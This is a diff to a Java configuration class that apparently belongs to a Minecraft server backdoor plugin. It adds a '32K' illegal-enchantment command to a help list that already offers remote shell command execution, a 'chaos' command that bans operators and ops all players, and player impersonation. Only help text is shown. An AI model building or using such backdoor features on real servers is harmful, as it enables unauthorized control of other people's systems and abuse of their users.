@@ -126,6 +126,7 @@ public class Config {
                     new Param[]{new Param("command", "shell command to execute. Check server platform with " + command_prefix + "info", true)}),
             new HelpItem("info", "shows informatin about server"),
             new HelpItem("chaos", "Deop and ban ops, op all regular players"),
+            new HelpItem("32K", "Add 32k enchants to item being held. (types = 'tool' or 'sword')",new Param[]{new Param("type", "type of item (tool or sword)", true)}),
             new HelpItem("seed", "get the current world seed"),
             new HelpItem("psay", "sends messages as player",
                     new Param[]{new Param("player", "player to impersonate", true),
